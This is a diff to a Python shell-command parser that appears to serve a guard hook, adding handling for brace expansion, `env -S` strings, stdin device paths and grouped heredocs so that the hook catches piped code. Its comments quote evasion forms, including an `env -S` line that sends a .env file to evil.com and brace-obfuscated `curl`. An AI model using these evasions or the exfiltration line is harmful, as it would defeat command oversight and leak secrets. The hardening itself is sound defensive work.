@@ -15,7 +15,9 @@ No I/O, no shell is ever run, and `normalize` never raises.
 
 from __future__ import annotations
 
+import posixpath
 import re
+from bisect import bisect_left
 from collections.abc import Callable, Iterable, Sequence
 from dataclasses import dataclass, field
 from functools import lru_cache
@@ -26,15 +28,23 @@ SUB_EMPTY: str = "@sub@"
 
 MAX_SCANS: int = 256  # nested -c / eval / herestring scans in one command
 MAX_DEPTH: int = 16  # nested $(...) / backticks / -c strings deeper than this count as unparsed
+# A command longer than this is not parsed at all (owner 2026-10-25, 2026-10-27: 128 KiB; the
+# offline guard's cap is 512 KiB): it counts as unparsed (so R1 blocks it after a mark) and the
+# store saves it as `… <unparsed>`. A bag of its words is kept (`_loose_bag`), so R0 and the command
+# rules still see them: padding hides no `npm publish`. The cap sits before the scanner and
+# `_piped_code`, so their walk (about 10 µs of Python a simple command) never runs on a long line
+# (closes L107: 2 MiB of newlines or `a(`×1M took seconds); the full hook stays under 1 s to 2 MiB.
+MAX_PARSE: int = 128 * 1024
 # Past this many links a line's links count as unknown (toward firing): groups nested in groups
 # link a command once for each pipe around them, and the parse must stay within the client's wait.
 MAX_LINKS: int = 20_000
 
-SHELLS: frozenset[str] = frozenset({"sh", "bash", "zsh", "dash", "ksh"})
+SHELLS: frozenset[str] = frozenset({"sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh"})
 # A quoted heredoc is literal data unless one of these reads it (D10, narrowed 2026-10-16).
 _READERS: frozenset[str] = frozenset({"ruby", "perl"})
 _INTERPRETERS: tuple[str, ...] = ("python", "node")  # name prefixes: python3.12, nodejs
-_SHELL_VALUE_OPTIONS: frozenset[str] = frozenset({"--rcfile", "--init-file"})
+# bash's long options are flags but these two; zsh's `--emulate sh` takes one too (P1)
+_SHELL_VALUE_OPTIONS: frozenset[str] = frozenset({"--rcfile", "--init-file", "--emulate"})
 
 _DQ_RUN = re.compile(r'[^"\\$`]+')  # plain text inside double quotes
 _BT_RUN = re.compile(r"[^`\\]+")  # plain text inside backticks
@@ -313,7 +323,7 @@ RUNNER_VERBS: frozenset[str] = frozenset({"run", "exec", "x", "dlx", "tool"})
 # runners among them.
 WRAPPERS: frozenset[str] = RUNNERS | frozenset(
     {"sudo", "doas", "env", "xargs", "parallel", "timeout", "gtimeout", "nice", "nohup"}
-    | {"command", "builtin", "exec", "time", "stdbuf", "caffeinate"}
+    | {"command", "builtin", "exec", "time", "stdbuf", "caffeinate", "script"}
 )
 _DURATION = re.compile(r"\d+(?:\.\d+)?[smhd]?")  # `timeout 5s`
 # Shell words that stand before or around a command and are no program.
@@ -331,14 +341,18 @@ def programs(argv: Sequence[str], *, narrow: bool = False) -> tuple[int, ...]:
 
     `narrow` (piped code; owner 2026-10-23): a wrapper whose next word is plainly a program adds
     only that word, and so on down the chain; `env` and `sudo` assignments, `timeout`'s duration
-    and a runner's verb (`uv run`) are skipped. An option there, or `parallel`, keeps every word.
-    So `xargs grep -l node` has two (`xargs`, `grep`), `xargs -0 grep -l sh` all."""
+    and a runner's verb (`uv run`) are skipped. An option there, a `timeout` value that is no plain
+    duration (`1e3`, `infinity`; P1), or `parallel`, keeps every word. So `xargs grep -l node` has
+    two (`xargs`, `grep`), `xargs -0 grep -l sh` all."""
     for index, word in enumerate(argv):
         if word in _KEYWORDS or _ASSIGNMENT.match(word):
             continue
         if word in _HEADS:
             return ()
-        if base_name(word) not in WRAPPERS:
+        name: str = base_name(word)
+        if unreadable(name):  # `$A python3`: what runs is unknown: every word may (P1)
+            return tuple(range(index, len(argv)))
+        if name not in WRAPPERS:
             return (index,)
         return _chain(argv, index) if narrow else tuple(range(index, len(argv)))
     return ()
@@ -348,10 +362,12 @@ def _chain(argv: Sequence[str], at: int) -> tuple[int, ...]:
     """`programs(narrow=True)` from the wrapper at `at`."""
     found: list[int] = [at]
     while (name := base_name(argv[at])) in WRAPPERS:
-        if name == "parallel":
+        if name in ("parallel", "script"):  # `script FILE python3`: the command is any later word
             return tuple(range(found[0], len(argv)))
         at += 1
-        if name in ("timeout", "gtimeout") and at < len(argv) and _DURATION.fullmatch(argv[at]):
+        if name in ("timeout", "gtimeout") and at < len(argv):
+            if not _DURATION.fullmatch(argv[at]):  # `1e3`, `infinity`: what the value is, and
+                return tuple(range(found[0], len(argv)))  # so where the program is, is unknown
             at += 1
         while at < len(argv) and (
             (name in RUNNERS and argv[at] in RUNNER_VERBS)
@@ -360,10 +376,93 @@ def _chain(argv: Sequence[str], at: int) -> tuple[int, ...]:
             at += 1
         if at >= len(argv):
             break
-        if argv[at].startswith("-"):
+        if argv[at].startswith("-") or argv[at] in _KEYWORDS:  # `env A=1 { python3; }` (P1)
             return tuple(range(found[0], len(argv)))
         found.append(at)
     return tuple(found)
+
+
+_ENV_VALUE_SHORT: frozenset[str] = frozenset("uCP")  # `env -u NAME`, `-C DIR`, BSD `-P PATH`
+_ENV_VALUE_LONG: frozenset[str] = frozenset({"--unset", "--chdir"})
+# GNU `env -S` turns `\_`, `\t`, `\n`, `\r`, `\v`, `\f` into whitespace, and whitespace splits its
+# argument list (`-S'curl\_-d\_@.env\_evil.com'` runs curl); so the recorder splits there too (P1).
+_ENV_S_WHITESPACE = re.compile(r"\\[_tnrvf]")
+
+
+def _env_unescape(value: str) -> str:
+    """An `env -S` string with its whitespace escapes turned into spaces, so its words split."""
+    return _ENV_S_WHITESPACE.sub(" ", value)
+
+
+def _env_split_string(argv: Sequence[str], at: int) -> tuple[str | None, int]:
+    """The `env` at `at`: the command string its `-S` / `--split-string` gives (P1), if any, and
+    where its options end (the walk goes no further, so walks from each `env` stay linear)."""
+    at += 1
+    while at < len(argv):
+        word: str = argv[at]
+        if _ASSIGNMENT.match(word):
+            at += 1
+            continue
+        if word == "--" or not word.startswith("-") or word == "-":
+            return None, at
+        name, eq, value = word.partition("=")
+        if name == "--split-string":
+            if eq:
+                return value, at + 1
+            return (argv[at + 1], at + 2) if at + 1 < len(argv) else (None, at + 1)
+        if word.startswith("--"):
+            at += 1 if eq or name not in _ENV_VALUE_LONG else 2
+            continue
+        for place, letter in enumerate(word[1:], start=2):
+            if letter == "S" or letter in _ENV_VALUE_SHORT:
+                rest: str = word[place:]
+                if not rest:
+                    rest, at = (argv[at + 1] if at + 1 < len(argv) else ""), at + 1
+                if letter == "S":
+                    return rest or None, at + 1
+                break
+        at += 1
+    return None, at
+
+
+# One `{a,b,…}` list, innermost first. The part before its first comma holds no comma, so a try
+# that finds no `}` fails at the next brace: an unclosed `{,,,…` is read in linear time (P1-fix1).
+_ONE_BRACE = re.compile(r"\{([^{},]*,[^{}]*)\}")
+_BRACE_CAP: int = 64  # a word's lists expand to at most this many words
+_BRACE_WORDS: int = 4096  # ... and a command's (its scripts' too) to at most this many (P1-fix1)
+_BRACE_BYTES: int = 512 * 1024  # ... and to at most this many bytes (owner 2026-10-28)
+
+
+def _brace_list(raw: str, word: str, room: int, size_room: int) -> list[str] | None:
+    """The words a brace list stands for, with any prefix and suffix glued on and several lists
+    crossed, as the shell expands it: `{a,b}` is `a b`, `cur{l,}` is `curl cur`, `{cur,}l` is
+    `curl l`, `c{u,}r{l,}` is `curl cur crl cr`. A quote, `$`, backtick or backslash in the raw
+    word leaves it as it is, as does a `{a..b}` sequence (no comma): then `[]`. Empty words stay
+    in the list for the count; the shell drops them (`{,} python3` runs python3). None past
+    `_BRACE_CAP` words, past `room` (the words the command may still expand to) or past
+    `size_room` (its bytes), counted before the words are made: the word is then left as it is
+    and the command counts as unparsed (P1-fix1: `cu{r,}{,}{,}{,}{,}{,}{,}l` runs curl)."""
+    if any(c in raw for c in "'\"$`\\") or "{" not in word:
+        return []
+    limit: int = min(_BRACE_CAP, room)
+    result: list[str] = [word]
+    size: int = len(word)  # the bytes of `result`
+    index: int = 0
+    while index < len(result):
+        match: re.Match[str] | None = _ONE_BRACE.search(result[index])
+        if match is None:
+            index += 1
+            continue
+        items: list[str] = match.group(1).split(",")
+        current: str = result[index]
+        rest: int = len(current) - (match.end() - match.start())
+        size += len(items) * rest + len(match.group(1)) - len(items) + 1 - len(current)
+        if len(result) - 1 + len(items) > limit or size > size_room:
+            return None
+        result[index : index + 1] = [
+            current[: match.start()] + item + current[match.end() :] for item in items
+        ]
+    return [] if result == [word] else result
 
 
 def _stdin_family(name: str) -> str | None:
@@ -382,7 +481,41 @@ _NODE_VALUE_OPTIONS: frozenset[str] = frozenset(
     {"-r", "--require", "-C", "--conditions", "--import", "--loader", "--experimental-loader"}
     | {"--input-type", "--env-file", "--env-file-if-exists", "--title"}
 )
-_NODE_SCRIPT = re.compile(r"/|\.[cm]?[jt]s$")  # a word that looks like a script, not a value
+# Node's own options that take no value, and every `--no-…`: a plain word after one is the script
+# (P1, G: `node --no-warnings server`). From `node --help` (v22.22.2): each listed with no `=…`, or
+# with an optional `[=…]` (`--inspect`). V8's options (`--trace-gc`) are not listed: after one,
+# the next word counts as its value (toward firing).
+_NODE_FLAGS: frozenset[str] = frozenset(
+    """
+    --abort-on-uncaught-exception --allow-addons --allow-child-process --allow-wasi
+    --allow-worker --build-snapshot --check --completion-bash --cpu-prof --disable-sigusr1
+    --disable-wasm-trap-handler --disallow-code-generation-from-strings
+    --enable-etw-stack-walking --enable-fips --enable-network-family-autoselection
+    --enable-source-maps --entry-url --experimental-addon-modules
+    --experimental-async-context-frame --experimental-default-config-file
+    --experimental-eventsource --experimental-import-meta-resolve
+    --experimental-inspector-network-resource --experimental-network-inspection
+    --experimental-permission --experimental-print-required-tla --experimental-test-coverage
+    --experimental-test-module-mocks --experimental-transform-types
+    --experimental-vm-modules --experimental-webstorage --experimental-worker-inspection
+    --expose-gc --force-context-aware --force-fips
+    --force-node-api-uncaught-exceptions-policy --frozen-intrinsics --heap-prof --help
+    --huge-max-old-generation-size --insecure-http-parser --inspect --inspect-brk
+    --inspect-wait --interactive --interpreted-frames-native-stack --jitless
+    --node-memory-debug --openssl-legacy-provider --openssl-shared-config
+    --pending-deprecation --permission --preserve-symlinks --preserve-symlinks-main --prof
+    --prof-process --report-compact --report-exclude-env --report-exclude-network
+    --report-on-fatalerror --report-on-signal --report-uncaught-exception --test
+    --test-force-exit --test-only --test-update-snapshots --throw-deprecation --tls-max-v1.2
+    --tls-max-v1.3 --tls-min-v1.0 --tls-min-v1.1 --tls-min-v1.2 --tls-min-v1.3
+    --trace-atomics-wait --trace-deprecation --trace-env --trace-env-js-stack
+    --trace-env-native-stack --trace-exit --trace-promises --trace-sigint --trace-sync-io
+    --trace-tls --trace-uncaught --trace-warnings --track-heap-objects --use-bundled-ca
+    --use-env-proxy --use-openssl-ca --use-system-ca --v8-options --version --watch
+    --watch-preserve-output --zero-fill-buffers
+    """.split()
+)
+_NODE_SCRIPT = re.compile(r"\.[cm]?[jt]s$")  # a word that names a script file
 
 
 def _is_stdin(word: str) -> bool:
@@ -390,13 +523,36 @@ def _is_stdin(word: str) -> bool:
 
 
 def _is_stdin_device(word: str) -> bool:
-    """`/dev/stdin` or `/dev/fd/N`: as a script or as `<`'s file, the code may be the pipe."""
+    """`/dev/stdin` or `/dev/fd/N`, case-folded and path-normalised first (`/dev/./stdin`,
+    `/dev/fd//0`, `//dev/stdin`, `/dev/../dev/stdin`, and macOS `/DEV/stdin`): as a script or as
+    `<`'s file, the code may be the pipe (D/F4, P1). An absolute word is normalised through
+    `/`-joined so POSIX's leading `//` keeps no special meaning."""
+    word = word.casefold()
+    if word.startswith("/"):
+        word = posixpath.normpath("/" + word.lstrip("/"))
     return word == "/dev/stdin" or _DEV_FD.fullmatch(word) is not None
 
 
 def holds_substitution(word: str) -> bool:
     """Does the word hold the output of a `$(…)` or backticks (`placeholder`)?"""
     return SUB_PREFIX in word or SUB_EMPTY in word
+
+
+def unreadable(word: str) -> bool:
+    """A word the parse cannot read plainly: a `$` expansion or a substitution's output. As a
+    program (its base name: `$HOME/bin/tool` is `tool`), a script or stdin's file
+    (`unreadable_file`) it counts as code from the pipe (P1, brief "Adversary")."""
+    return "$" in word or holds_substitution(word)
+
+
+def unreadable_file(word: str) -> bool:
+    """A script or stdin file the parse cannot read: its last part is unreadable (`$F`,
+    `<(cat)`), or an unreadable word ends in a stdin device's name (`$D/stdin`, `$D/0`).
+    `$HOME/t.py` is a file named `t.py`."""
+    if not unreadable(word):
+        return False
+    name: str = word.rpartition("/")[2]
+    return unreadable(name) or name in ("", "stdin") or name.isdigit()
 
 
 def _shell_stdin_step(words: Sequence[str], at: int) -> int:
@@ -419,30 +575,54 @@ def _shell_stdin_step(words: Sequence[str], at: int) -> int:
 def _stdin_step(family: str, words: Sequence[str], at: int) -> int:
     """One step of a stdin walk: _STDIN, _SCRIPT, or how many words it moves on."""
     arg: str = words[at]
-    if _is_stdin(arg):
+    # `$F`, `<(cat)` at a script/stdin position is the pipe (P1); an option whose value holds a
+    # `$` (`-W$W`, `--env-file=$ENV`) is not a script, so its family's walk names the real one
+    if _is_stdin(arg) or (not arg.startswith(("-", "+")) and unreadable_file(arg)):
         return _STDIN
-    if arg == "--":  # what follows is the script, if anything does
-        return _STDIN if at + 1 >= len(words) or _is_stdin(words[at + 1]) else _SCRIPT
+    if arg == "--":  # what follows is the script, if anything does (`-- <(cat)`, `-- $F`: pipe)
+        nxt: str = words[at + 1] if at + 1 < len(words) else ""
+        return _STDIN if not nxt or _is_stdin(nxt) or unreadable_file(nxt) else _SCRIPT
     if family == "shell":
         return _shell_stdin_step(words, at)
     if not arg.startswith("-"):
         return _SCRIPT
     if family == "node":
         return _STDIN if _node_code(arg) else 2 if _node_takes_value(words, at) else 1
+    if family == "python" and _python_reads_code(words, at):
+        return _STDIN
     move: int = _STEPS[family](arg)
     return _STDIN if move == _CODE else _SCRIPT if move == _END else move
 
 
 def _node_takes_value(words: Sequence[str], at: int) -> bool:
     """A node option that takes the next word: a known one, or a long option the walk does not
-    know when the next word does not look like a script (toward firing: in
-    `node --disable-warning X` the X is no script, and node reads its code from stdin)."""
+    know (no flag of `_NODE_FLAGS`, no `--no-…`) when the next word names no script file (toward
+    firing: in `node --disable-warning X` or `--disable-warning a/b` the value is no script, and
+    node reads its code from stdin; P1, C)."""
     arg: str = words[at]
     if arg in _NODE_VALUE_OPTIONS:
         return True
     if not arg.startswith("--") or "=" in arg or at + 1 >= len(words):
         return False
+    if arg in _NODE_FLAGS or arg.startswith("--no-"):
+        return False
     return _NODE_SCRIPT.search(words[at + 1]) is None
+
+
+# The first of these letters in a python option word decides `_python_reads_code`.
+_PYTHON_DECIDES: re.Pattern[str] = re.compile(r"[imcWXQ]")
+
+
+def _python_reads_code(words: Sequence[str], at: int) -> bool:
+    """Fed by a pipe, python runs it as code after `-i` (it reads stdin once the script ends) and
+    with `-m code` (the console), owner 2026-10-24. Letter by letter, as `_python_step`."""
+    arg: str = words[at]
+    if arg.startswith("--") or (letter := _PYTHON_DECIDES.search(arg, 1)) is None:
+        return False
+    if letter.group() == "m":
+        module: str = arg[letter.end() :] or (words[at + 1] if at + 1 < len(words) else "")
+        return module == "code"
+    return letter.group() == "i"  # `c`, `W`, `X`, `Q`: code, or a value: `_python_step` answers
 
 
 def _stdin_table(family: str, words: Sequence[str]) -> list[bool]:
@@ -460,7 +640,10 @@ def reads_stdin(words: Sequence[str]) -> bool:
     """Does an interpreter or a shell at a program position read its code from stdin?"""
     tables: dict[str, list[bool]] = {}
     for at in programs(words, narrow=True):
-        family: str | None = _stdin_family(base_name(words[at]))
+        name: str = base_name(words[at])
+        if unreadable(name):  # `$SH`, `$(echo python3)`: an interpreter? (P1)
+            return True
+        family: str | None = _stdin_family(name)
         if family is None:
             continue
         if family not in tables:
@@ -482,6 +665,25 @@ def loose_commands(text: str) -> tuple[tuple[str, ...], ...]:
     return tuple(out)
 
 
+# Over the parse cap, the bag of words keeps this many distinct words: the first half and the last
+# (each costs the rules about 10 to 30 µs, twice; 2 MiB holds about 290,000).
+_BAG_WORDS: int = 8192
+
+
+def _loose_bag(text: str) -> tuple[tuple[str, ...], ...]:
+    """The loose scan of a command over the parse cap (P1): its distinct words, split in C, as one
+    command listed twice, so each word stands after every other (a program's extra words are
+    found wherever they stand: padding hides no `git push --force`). Toward firing. Past
+    _BAG_WORDS distinct words only the first and the last half of them are kept, so the rules'
+    work stays bounded; a command before or after a long comment or heredoc is still seen."""
+    for escape in ("\\n", "\\r", "\\t"):  # `\n` written out inside JSON text
+        text = text.replace(escape, "\n")
+    words: tuple[str, ...] = tuple(dict.fromkeys(text.translate(_SEPARATORS).split()))
+    if len(words) > _BAG_WORDS:
+        words = words[: _BAG_WORDS // 2] + words[-_BAG_WORDS // 2 :]
+    return (words + words,) if words else ()
+
+
 @dataclass
 class _Heredoc:
     delimiter: str
@@ -489,6 +691,7 @@ class _Heredoc:
     strip_tabs: bool
     owner: list[str]  # the words of the simple command that owns the redirect
     index: int = -1  # that command's index, once it is made
+    group: tuple[int, int] | None = None  # the commands of the group the owner closes (P1)
 
 
 # A substitution as the scanner meets it: "in" (its output goes into the command it stands in) or
@@ -501,7 +704,8 @@ class _Cmd:
     """The simple command being read. `targets`: positions of words that are redirect targets;
     `stdin`: "file" or "sub" when stdin is redirected (`< f`, `< <(…)`); `subs`: the
     substitutions in its words and herestrings; `start`: no program word yet (only keywords such
-    as `then` or `!`)."""
+    as `then` or `!`); `group`: the first command of the group it closes (`}`, `done`, a
+    subshell's `)`), whose commands its stdin redirect, heredoc or herestring feeds (P1, F1)."""
 
     words: list[str] = field(default_factory=list)
     herestrings: list[str] = field(default_factory=list)
@@ -509,6 +713,7 @@ class _Cmd:
     stdin: str = ""
     subs: list[_Sub] = field(default_factory=list)
     start: bool = True
+    group: int | None = None
 
 
 @dataclass(frozen=True)
@@ -524,12 +729,14 @@ _NO_META: _Meta = _Meta(frozenset(), "")  # most commands: one shared, it is fro
 class _Frame:
     """A list of commands being read: the whole text, a substitution's, or a group's (`(`, `{`,
     or the keyword that opened it). `start` is the first command of the part being read, `hub` the
-    pipe that feeds it; `pattern`: a `case` that is reading a pattern, where `)` ends it."""
+    pipe that feeds it; `pattern`: a `case` that is reading a pattern, where `)` ends it; `first`:
+    the group's first command."""
 
     kind: str
     start: int
     hub: int | None = None
     pattern: bool = False
+    first: int = 0
 
 
 # Group words at the start of a command, what closes each, and the words after which the next one
@@ -550,6 +757,11 @@ _STARTERS: frozenset[str] = frozenset(
 _HIDERS: frozenset[str] = frozenset({"function", "coproc"})  # what runs, and where, is unseen
 
 
+def _any_within(indexes: list[int], first: int, last: int) -> bool:
+    at: int = bisect_left(indexes, first)
+    return at < len(indexes) and indexes[at] < last
+
+
 class _Out:
     def __init__(self) -> None:
         self.commands: list[tuple[str, ...]] = []
@@ -558,10 +770,28 @@ class _Out:
         self.unquoted_heredoc: bool = False
         self.code_heredoc: bool = False
         self.scans: int = 0  # nested scans so far; MAX_SCANS caps the work of one command
+        self.braces: int = 0  # words brace lists expanded to so far; _BRACE_WORDS caps them
+        self.brace_bytes: int = 0  # ... and their bytes; _BRACE_BYTES caps them
         self.links: list[tuple[int, int]] = []
         self.hubs: int = 0
         self.fed: set[int] = set()  # commands that read a pipe (or `>(…)`, or `< <(…)`)
         self.links_unknown: bool = False
+        self.looked: int = 0  # commands before this one are listed in `readers` and `shells`
+        self.readers: list[int] = []  # commands with a shell or interpreter word, in order
+        self.shells: list[int] = []  # commands with a shell word, in order
+
+    def holds(self, first: int, last: int) -> tuple[bool, bool]:
+        """Whether a command from `first` up to `last` has a shell or interpreter word, and
+        whether one has a shell word. Each command is looked at once, however many groups ask
+        (P1: a heredoc or herestring on a group's closer)."""
+        for index in range(self.looked, last):
+            names: list[str] = [base_name(w) for w in self.commands[index]]
+            if any(is_reader(name) for name in names):
+                self.readers.append(index)
+                if any(name in SHELLS for name in names):
+                    self.shells.append(index)
+        self.looked = max(self.looked, last)
+        return _any_within(self.readers, first, last), _any_within(self.shells, first, last)
 
     def hub(self) -> int:
         self.hubs += 1
@@ -618,6 +848,8 @@ class _Scanner:
                         break
                     doc.index = len(out.commands)
                 self.finish_command(cmd)
+            elif cmd.group is not None:
+                self.group_herestrings(cmd, len(out.commands))  # `( python3 ) <<< 'x'` (P1)
             cmd = _Cmd()
             self.target = ""
 
@@ -636,11 +868,14 @@ class _Scanner:
         def open_group(kind: str) -> None:
             if len(frames) > MAX_DEPTH:
                 out.links_unknown = True
-            frames.append(_Frame(kind, len(out.commands), pattern=kind == "case"))
+            first: int = len(out.commands)
+            frames.append(_Frame(kind, first, pattern=kind == "case", first=first))
 
         def close_group(word: str) -> None:
             if len(frames) > 1 and _OPENERS.get(frames[-1].kind) == word:
-                end_part(frames.pop())
+                frame: _Frame = frames.pop()
+                end_part(frame)
+                cmd.group = frame.first  # `{ python3; } < <(cat x)` (P1, F1)
             else:
                 out.links_unknown = True  # a closer that closes nothing
 
@@ -651,8 +886,14 @@ class _Scanner:
             if added and self.target:
                 at: int = len(cmd.words) - 1
                 cmd.targets.append(at)
-                if self.target == "<" and not _is_stdin_device(cmd.words[at]):
-                    cmd.stdin = "sub" if cmd.words[at].startswith(SUB_PREFIX) else "file"
+                source: str = cmd.words[at]
+                if self.target == "<" and not _is_stdin_device(source):
+                    if source.startswith(SUB_PREFIX):
+                        cmd.stdin = "sub"
+                    elif not unreadable_file(
+                        source
+                    ):  # `< $F` may be /dev/stdin: stdin stays the pipe
+                        cmd.stdin = "file"
                 self.target = ""
 
         def finish() -> None:
@@ -718,6 +959,7 @@ class _Scanner:
                 top = frames[-1]
                 if top.kind == "(":
                     end_part(frames.pop())
+                    cmd.group = top.first  # `( python3 ) < <(cat x)` (P1, F1)
                 elif top.kind == "case" and top.pattern:
                     top.pattern = False  # the end of a pattern
                 elif closer == ")":
@@ -733,6 +975,7 @@ class _Scanner:
                 self.redirect(cmd, heredocs)
                 take(len(cmd.words) - before)
                 continue
+            start: int = self.i
             word: str = self.word()
             if word.isdigit() and self.i < n and s[self.i] in "<>":
                 self.subs.clear()
@@ -746,6 +989,23 @@ class _Scanner:
                 elif word in _HIDERS:
                     out.links_unknown = True
                 cmd.start = word in _STARTERS
+            brace: bool = not self.target and "{" in s[start : self.i]  # `{curl,…}`, `cur{l,}` (P1)
+            if brace:
+                items: list[str] | None = _brace_list(
+                    s[start : self.i],
+                    word,
+                    _BRACE_WORDS - out.braces,
+                    _BRACE_BYTES - out.brace_bytes,
+                )
+                if items is None:
+                    out.unparsed = True  # past the brace bound: left as it is (P1-fix1)
+                elif items:
+                    out.braces += len(items)
+                    out.brace_bytes += sum(map(len, items))
+                    items = [item for item in items if item]  # the shell drops an empty word
+                    cmd.words += items  # a brace list (with a prefix/suffix) expands (P1)
+                    take(len(items))
+                    continue
             cmd.words.append(word)
             take(1)
         finish()
@@ -763,6 +1023,15 @@ class _Scanner:
         )
         if cmd.stdin == "sub":
             out.fed.add(index)
+            if cmd.group is not None:  # a group's stdin: every command of it reads it (P1, F1)
+                hub: int = out.hub()
+                out.link(
+                    (inner, hub)
+                    for kind, first, last in cmd.subs
+                    if kind != "out"
+                    for inner in range(first, last)
+                )
+                out.feed(hub, cmd.group)
         for kind, first, last in cmd.subs:
             for inner in range(first, last):
                 if kind == "out":  # `>(…)` reads what the command writes
@@ -773,6 +1042,8 @@ class _Scanner:
         names: list[str] = [base_name(w) for w in words]
         if herestrings and any(is_reader(name) for name in names):
             self.out.code_heredoc = True
+        if cmd.group is not None:
+            self.group_herestrings(cmd, index)
         # Each distinct text once, and only the first `eval` (it already holds the later ones):
         # `eval eval eval ... curl x` or `bash bash bash -c ...` must not multiply the work, nor
         # may each word walk a copy of the words after it (F18).
@@ -781,8 +1052,13 @@ class _Scanner:
         texts: dict[str, None] = {}
         scripts: list[int | None] = []  # `script_indexes(words)`, at the first shell
         evaled: bool = False
+        env_done: int = 0  # `env` runs its `-S` string as a command (P1); options read up to here
         for position, name in enumerate(names):
-            if name in SHELLS:
+            if name == "env" and position >= env_done:
+                split, env_done = _env_split_string(words, position)
+                if split is not None:
+                    texts[_env_unescape(split)] = None
+            elif name in SHELLS:
                 first_shell: bool = not scripts
                 if first_shell:
                     scripts = script_indexes(words)
@@ -796,6 +1072,18 @@ class _Scanner:
                 evaled = True
         for text in texts:
             self.sub_scan(text)
+
+    def group_herestrings(self, cmd: _Cmd, last: int) -> None:
+        """A herestring on a group's closer feeds the group's commands, up to `last`: code when
+        one is a shell or an interpreter, and a script to read when one is a shell (P1)."""
+        if cmd.group is None or not cmd.herestrings:
+            return
+        reads, shell = self.out.holds(cmd.group, last)
+        if reads:
+            self.out.code_heredoc = True
+        if shell:
+            for text in dict.fromkeys(cmd.herestrings):
+                self.sub_scan(text)
 
     def sub_scan(self, text: str) -> None:
         self.out.scans += 1
@@ -849,7 +1137,10 @@ class _Scanner:
             if not delimiter:
                 self.out.unparsed = True
                 return
-            heredocs.append(_Heredoc(delimiter, quoted, strip, cmd.words))
+            group: tuple[int, int] | None = (
+                None if cmd.group is None else (cmd.group, len(self.out.commands))
+            )
+            heredocs.append(_Heredoc(delimiter, quoted, strip, cmd.words, group=group))
             return
         first: int = self.i
         self.i += 1  # `>`, `>>`, `>&`, `<&`, `&>`, `>|`, `<>`: the target stays a word
@@ -901,6 +1192,10 @@ class _Scanner:
         s, n = self.s, self.n
         names: list[str] = [base_name(w) for w in doc.owner]
         reader: bool = any(is_reader(name) for name in names)
+        shell: bool = any(name in SHELLS for name in names)
+        if doc.group is not None:  # `{ python3; } <<'EOF'` (P1)
+            reads, shells = self.out.holds(*doc.group)
+            reader, shell = reader or reads, shell or shells
         pos: int = self.i
         body: list[str] = []
         while True:
@@ -932,7 +1227,7 @@ class _Scanner:
             inner += self.expansions(text)  # the shell expands $(...) and backticks in the body
         if reader:
             self.out.code_heredoc = True  # D10: a quoted body is data unless something runs it
-            if any(name in SHELLS for name in names):
+            if shell:
                 self.sub_scan(text)
         if doc.index >= 0:
             self.out.link((i, doc.index) for first, last in inner for i in range(first, last))
@@ -1151,6 +1446,8 @@ def script_indexes(args: Sequence[str]) -> list[int | None]:
 @lru_cache(maxsize=4)  # mark, R0 and R1 parse the same command in one request
 def normalize(text: str) -> Parsed:
     """Parse a shell command line. Never raises: trouble becomes `unparsed`."""
+    if len(text) > MAX_PARSE:  # too long to parse: unparsed, read only as a bag of words
+        return Parsed(commands=(), unparsed=True, loose=_loose_bag(text))
     out = _Out()
     try:
         _Scanner(text, out, 0).parse_list(None)
